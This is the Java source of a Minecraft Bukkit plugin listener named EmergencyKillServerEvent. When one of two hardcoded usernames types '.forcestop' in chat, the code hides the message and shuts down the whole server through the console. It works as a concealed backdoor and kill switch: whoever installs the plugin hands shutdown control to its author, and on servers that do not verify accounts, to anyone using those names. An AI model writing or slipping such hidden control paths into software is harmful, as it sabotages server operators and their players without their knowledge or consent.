package me.zpandakst.events;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class EmergencyKillServerEvent implements Listener {
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event)
    {
        if (((event.getPlayer().getName().equals("zPandaKST_")) || (event.getPlayer().getName().equals("zPandaKST"))) &&
                (event.getMessage().equalsIgnoreCase(".forcestop"))) {
            event.setCancelled(true);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stop");
        }
    }
}
